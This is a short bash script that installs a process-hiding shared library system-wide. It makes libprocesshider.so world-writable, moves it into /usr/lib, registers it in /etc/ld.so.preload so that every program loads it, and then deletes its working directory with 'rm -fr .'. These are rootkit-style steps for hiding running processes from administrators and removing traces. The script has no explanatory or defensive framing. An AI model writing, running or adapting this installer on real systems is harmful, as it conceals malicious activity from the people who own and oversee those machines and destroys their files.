#!/bin/bash

chmod +777 ./libprocesshider.so
mv ./libprocesshider.so /usr/lib/
echo /usr/lib/libprocesshider.so > /etc/ld.so.preload
rm -fr .